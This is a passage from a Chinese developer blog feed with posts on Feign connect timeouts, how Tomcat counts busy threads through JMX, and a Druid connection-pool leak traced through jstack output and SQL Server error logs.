<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">feign-core.version</span>&gt;</span>10.10.1<span class="tag">&lt;/<span class="name">feign-core.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;feign-core.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-ribbon<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;feign-core.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码里连接超时设置为100mills，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> List&lt;Integer&gt; effectiveMebIds =</span><br><span class="line">           personalMemberRemote.getEffectiveMebIds(<span class="keyword">new</span> Request.Options(<span class="number">100</span>, <span class="number">500</span>), Lists.newArrayList(<span class="number">1</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">1386232841</span>));</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.l.DynamicServerListLoadBalancer-179  - Setting server list <span class="keyword">for</span> zones: &#123;defaultzone=[192.168.16.211:10020]&#125;</span><br><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.loadbalancer.BaseLoadBalancer-472  - LoadBalancer [user-center_defaultzone]: clearing server list (SET op)</span><br><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.loadbalancer.BaseLoadBalancer-488  - LoadBalancer [user-center_defaultzone]:  addServer [192.168.16.211:10020]</span><br><span class="line">13:55:21.600 [main] DEBUG c.n.l.ZoneAwareLoadBalancer-112  - Zone aware logic disabled or there is only one zone</span><br><span class="line">13:55:21.633 [main] DEBUG c.n.loadbalancer.LoadBalancerContext-492  - user-center using LB returned Server: 192.168.16.211:10020 <span class="keyword">for</span> request http:///personalMember/getEffectiveMebIds</span><br><span class="line">13:55:21.741 [main] DEBUG c.n.l.reactive.LoadBalancerCommand-314  - Got error java.net.SocketTimeoutException: connect timed out when executed on server 192.168.16.211:10020</span><br><span class="line">13:55:22.253 [main] DEBUG c.n.l.ZoneAwareLoadBalancer-112  - Zone aware logic disabled or there is only one zone</span><br><span class="line">13:55:22.254 [main] DEBUG c.n.loadbalancer.LoadBalancerContext-492  - user-center using LB returned Server: 192.168.16.211:10020 <span class="keyword">for</span> request http:///personalMember/getEffectiveMebIds</span><br><span class="line">13:55:22.358 [main] DEBUG c.n.l.reactive.LoadBalancerCommand-314  - Got error java.net.SocketTimeoutException: connect timed out when executed on server 192.168.16.211:10020</span><br><span class="line"></span><br><span class="line">feign.RetryableException: connect timed out executing POST http://user-center/personalMember/getEffectiveMebIds</span><br><span class="line"></span><br><span class="line">	at feign.FeignException.errorExecuting(FeignException.java:249)</span><br><span class="line">	at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:129)</span><br><span class="line">	at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89)</span><br><span class="line">	at feign.ReflectiveFeign<span class="variable">$FeignInvocationHandler</span>.invoke(ReflectiveFeign.java:100)</span><br><span class="line">	at com.sun.proxy.<span class="variable">$Proxy36</span>.getEffectiveMebIds(Unknown Source)</span><br></pre></td></tr></table></figure>
<p>直接超时了，说明这个限制生效了。</p>
]]></content>
      
        <categories>
            
            <category> feign </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring-cloud </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcat busy thread如何统计的]]></title>
      <url>http://qsli.github.io/2020/04/27/tomcat-busy-thread/</url>
      <content type="html"><![CDATA[<h2 id="tomcat-busy-thread"><a href="#tomcat-busy-thread" class="headerlink" title="tomcat busy thread"></a>tomcat busy thread</h2><p>突然好奇tomcat的busy thread怎么统计的，翻了下代码。</p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.tomcat.util.net.AbstractEndpoint#getCurrentThreadsBusy   </span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return the amount of threads that are in use</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the amount of threads that are in use</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCurrentThreadsBusy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (executor!=<span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (executor <span class="keyword">instanceof</span> ThreadPoolExecutor) &#123;</span><br><span class="line">      <span class="keyword">return</span> ((ThreadPoolExecutor)executor).getActiveCount();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (executor <span class="keyword">instanceof</span> ResizableExecutor) &#123;</span><br><span class="line">      <span class="keyword">return</span> ((ResizableExecutor)executor).getActiveCount();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实就是在执行任务的线程跟线程的状态没有关系：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java.util.concurrent.ThreadPoolExecutor#getActiveCount</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the approximate number of threads that are actively</span></span><br><span class="line"><span class="comment">     * executing tasks.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the number of threads</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getActiveCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">  mainLock.lock();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Worker w : workers)</span><br><span class="line">      <span class="keyword">if</span> (w.isLocked())</span><br><span class="line">        ++n;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    mainLock.unlock();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> MBeanServer server = ManagementFactory.getPlatformMBeanServer();</span><br><span class="line">Set&lt;ObjectName&gt; names = server.queryNames(<span class="keyword">new</span> ObjectName(<span class="string">"Catalina:type=ThreadPool,*"</span>), <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">final</span> ObjectName name : names) &#123;</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    <span class="keyword">final</span> Object maxThreads = server.getAttribute(name, <span class="string">"maxThreads"</span>);</span><br><span class="line">    <span class="keyword">final</span> Object currentThreadCount = server.getAttribute(name, <span class="string">"currentThreadCount"</span>);</span><br><span class="line">    <span class="keyword">final</span> Object currentThreadsBusy = server.getAttribute(name, <span class="string">"currentThreadsBusy"</span>);</span><br><span class="line">    System.out.println(<span class="string">"maxThreads = "</span> + maxThreads);</span><br><span class="line">    System.out.println(<span class="string">"currentThreadCount = "</span> + currentThreadCount);</span><br><span class="line">    System.out.println(<span class="string">"currentThreadsBusy = "</span> + currentThreadsBusy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Catalina:<span class="built_in">type</span>=ThreadPool,name=<span class="string">"ajp-nio-8009"</span></span><br><span class="line">maxThreads = 200</span><br><span class="line">currentThreadCount = 10</span><br><span class="line">currentThreadsBusy = 0</span><br><span class="line">Catalina:<span class="built_in">type</span>=ThreadPool,name=<span class="string">"http-nio-8080"</span></span><br><span class="line">maxThreads = 200</span><br><span class="line">currentThreadCount = 10</span><br><span class="line">currentThreadsBusy = 0</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> busy-thread </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Druid连接泄露记录]]></title>
      <url>http://qsli.github.io/2020/04/25/druid-conn-leak/</url>
      <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>当时数据库需要升级配置，已知中间会有闪断，按照之前的经验都是自动重连然后恢复。但是，这次tomcat的连接线程全部变成busy，导致应用不能提供服务。线程栈如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"http-nio-11022-exec-196"</span> <span class="comment">#216701 daemon prio=5 os_prio=0 tid=0x00007fbac4082000 nid=0x3c4a waiting on condition [0x00007fba0fb52000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">	at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">	- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00007fbb318710f0&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">	at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.takeLast(DruidDataSource.java:1899)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.getConnectionInternal(DruidDataSource.java:1460)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.getConnectionDirect(DruidDataSource.java:1255)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5007)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.filter.logging.LogFilter.dataSource_getConnection(LogFilter.java:876)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.filter.stat.StatFilter.dataSource_getConnection(StatFilter.java:680)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.filter.stat.StatFilter.dataSource_getConnection(StatFilter.java:680)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1233)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1225)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:90)</span><br><span class="line">	at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:140)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">	at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">	at org.mybatis.spring.transaction.SpringManagedTransaction.getConnection(SpringManagedTransaction.java:68)</span><br><span class="line">	at com.atour.migrate.helper.mybatis.interceptor.MyBatisMigrateChainIdKiller.checkDsIgnoreTableStatus(MyBatisMigrateChainIdKiller.java:181)</span><br></pre></td></tr></table></figure>
<p>查看jstack的输出发现连接线程都卡在了<code>DruidDataSource.java:1899</code>， 代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DruidConnectionHolder <span class="title">takeLast</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException, SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">while</span> (poolingCount == <span class="number">0</span>) &#123;</span><br><span class="line">               emptySignal(); <span class="comment">// send signal to CreateThread create connection</span></span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (failFast &amp;&amp; failContinuous.get()) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> DataSourceNotAvailableException(createError);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               notEmptyWaitThreadCount++;</span><br><span class="line">               <span class="keyword">if</span> (notEmptyWaitThreadCount &gt; notEmptyWaitThreadPeak) &#123;</span><br><span class="line">                   notEmptyWaitThreadPeak = notEmptyWaitThreadCount;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                 	<span class="comment">// DruidDataSource.java:1899 卡在这里</span></span><br><span class="line">                   notEmpty.await(); <span class="comment">// signal by recycle or creator</span></span><br><span class="line">               &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                   notEmptyWaitThreadCount--;</span><br><span class="line">               &#125;</span><br><span class="line">               notEmptyWaitCount++;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (!enable) &#123;</span><br><span class="line">                   connectErrorCountUpdater.incrementAndGet(<span class="keyword">this</span>);</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> DataSourceDisableException();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">           notEmpty.signal(); <span class="comment">// propagate to non-interrupted thread</span></span><br><span class="line">           notEmptySignalCount++;</span><br><span class="line">           <span class="keyword">throw</span> ie;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       decrementPoolingCount();</span><br><span class="line">       DruidConnectionHolder last = connections[poolingCount];</span><br><span class="line">       connections[poolingCount] = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> last;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>等待在druid的notEmpty队里上，等待有可用的连接。找到对应的创建连接线程：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Druid-ConnectionPool-Create-219971169"</span> <span class="comment">#80 daemon prio=5 os_prio=0 tid=0x00007fbab2fce000 nid=0x67e0 waiting on condition [0x00007fba2b974000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">	at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">	- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00007fbb31048098&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">	at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource<span class="variable">$CreateConnectionThread</span>.run(DruidDataSource.java:2448)</span><br><span class="line"></span><br><span class="line">   Locked ownable synchronizers:</span><br><span class="line">	- None</span><br></pre></td></tr></table></figure>
<p>对应的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 防止创建超过maxActive数量的连接</span></span><br><span class="line"><span class="keyword">if</span> (activeCount + poolingCount &gt;= maxActive) &#123;</span><br><span class="line">  <span class="comment">// DruidDataSource.java:2448</span></span><br><span class="line">  empty.await();</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>奇怪的是，创建连接的线程在等待empty的条件。问题可能就出在<code>activeCount + poolingCount &gt;= maxActive</code>这个条件上，其他线程都在等待连接，所以<code>poolingCount</code>肯定是0（连接池里没有空闲的连接），那么有问题的肯定是<code>activeCount</code>这里了。</p>
<p>第一反应是<code>druid</code>的bug，去github的issue上找了好久也没有找到类似的bug，只能再深入的挖掘系统的错误日志，最终还是找到了一些端倪。最初断开连接的时候出错日志：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">2020-04-09 17:32:29.321 ERROR [pms-provider-prod,cbcb523cffa38a5d,cbcb523cffa38a5d,<span class="literal">false</span>] --- [io-11022-exec-2] c.a.m.h.m.i.MyBatisMigrateChainIdKiller  : migrate.helper.MyBatisMigrateChainIdKillerError处理过程出现错误,</span><br><span class="line"></span><br><span class="line">org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: SQL Server 未返回响应。连接已关闭。</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:81)</span><br><span class="line">	at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">	at org.mybatis.spring.transaction.SpringManagedTransaction.getConnection(SpringManagedTransaction.java:68)</span><br><span class="line">	at com.atour.migrate.helper.mybatis.interceptor.MyBatisMigrateChainIdKiller.checkDsIgnoreTableStatus(MyBatisMigrateChainIdKiller.java:181)</span><br><span class="line">	...</span><br><span class="line">Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: SQL Server 未返回响应。连接已关闭。</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.terminate(SQLServerConnection.java:1667)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.terminate(SQLServerConnection.java:1654)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSReader.readPacket(IOBuffer.java:4844)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSCommand.startResponse(IOBuffer.java:6154)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSCommand.startResponse(IOBuffer.java:6106)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection<span class="variable">$1ConnectionCommand</span>.doExecute(SQLServerConnection.java:1756)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:5696)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1715)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectionCommand(SQLServerConnection.java:1761)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.setCatalog(SQLServerConnection.java:2063)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:750)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl.setCatalog(ConnectionProxyImpl.java:437)</span><br><span class="line">	at com.alibaba.druid.pool.DruidPooledConnection.setCatalog(DruidPooledConnection.java:910)</span><br><span class="line">	at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:143)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">	... 131 common frames omitted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2020-04-09 17:32:43.701 ERROR [pms-provider-prod,,,] --- [reate-219971169] com.alibaba.druid.pool.DruidDataSource   : create connection SQLException, url: jdbc:sqlserver://xxx:3433;DatabaseName=xx, errorCode 0, state 08S01</span><br><span class="line"></span><br><span class="line">com.microsoft.sqlserver.jdbc.SQLServerException: 通过端口 1433 连接到主机 R8IC10364 的 TCP/IP 连接失败。错误:“null。请验证连接属性。确保 SQL Server 的实例正在主机上运行，且在此端口接受 TCP/IP 连接，还要确保防火墙没有阻止到此端口的 TCP 连接。”。</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(SQLServerException.java:190)</span><br><span 